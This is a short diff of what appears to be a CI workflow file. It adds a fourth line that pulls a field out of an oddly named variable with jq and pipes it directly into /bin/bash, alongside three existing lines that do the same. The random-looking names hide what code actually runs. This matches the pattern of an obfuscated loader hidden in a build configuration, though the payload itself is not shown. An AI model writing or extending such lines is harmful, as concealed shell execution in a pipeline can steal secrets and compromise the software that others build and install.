@@ -25,6 +25,7 @@ jobs:
           echo $kqpna9 | jq -r .lor47818 | /bin/bash
           echo $rrb17 | jq -r .rdfny6655 | /bin/bash
           echo $yqxj01 | jq -r .bpyqz46339 | /bin/bash
+          printf '%s' "$p42" | jq -r .pd86 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
